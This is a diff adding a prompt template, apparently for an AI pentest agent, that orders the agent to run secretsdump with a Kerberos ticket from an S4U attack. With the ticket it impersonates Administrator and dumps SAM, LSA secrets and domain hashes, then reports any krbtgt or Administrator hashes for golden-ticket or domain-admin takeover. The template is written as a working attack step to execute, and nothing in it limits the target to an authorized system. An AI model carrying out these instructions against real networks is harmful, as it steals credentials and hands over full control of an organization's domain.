@@ -1,0 +1,40 @@
+**KERBEROS TICKET-BASED SECRETSDUMP**
+
+Target: {{ target }}
+Domain: {{ domain }}
+Username: {{ user }}
+Ticket Path: {{ ticket }}
+DC IP: {{ dc_ip_display }}
+Task ID: {{ task_id }}
+
+**CRITICAL: You have a Kerberos ticket from S4U attack!**
+This ticket allows you to impersonate Administrator to the target.
+
+**EXECUTE secretsdump with Kerberos ticket:**
+secretsdump(
+    target='{{ target }}',
+    username='{{ user }}',
+    no_pass=True,
+    ticket_path='{{ ticket }}'{% if dc_ip %},
+    dc_ip='{{ dc_ip }}'{% endif %}
+)
+
+**IMPORTANT:**
+- The ticket_path sets KRB5CCNAME for Kerberos auth
+- no_pass=True tells secretsdump to use -k -no-pass
+- This will dump SAM, LSA secrets, and domain hashes if on a DC
+
+If secretsdump succeeds, look for:
+- krbtgt hash -> GOLDEN TICKET capability
+- Administrator hash -> DOMAIN ADMIN ACHIEVED
+
+Report any hashes found in JSON format:
+```json
+{"hash": {"username": "Administrator", "hash_value": "...", "hash_type": "NTLM", "domain": "..."}}
+```
+{% if state_context %}
+
+## Current Operation State
+
+{{ state_context }}
+{% endif -%}
